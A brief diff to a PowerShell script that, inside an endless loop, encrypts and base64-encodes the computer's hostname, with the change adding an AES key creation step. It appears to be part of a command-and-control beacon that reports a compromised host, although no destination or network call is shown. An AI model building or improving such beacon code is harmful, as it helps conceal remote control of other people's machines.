@@ -84,6 +84,7 @@ while ($True) {
 
     try {
             $HOSTNAME = "magic_hostname=$env:computername"
+			$key = Create-AesKey
             $SEND = Encrypt-String $key $HOSTNAME
             $s = [System.Text.Encoding]::UTF8.GetBytes($SEND)
             $SEND = [System.Convert]::ToBase64String($s)
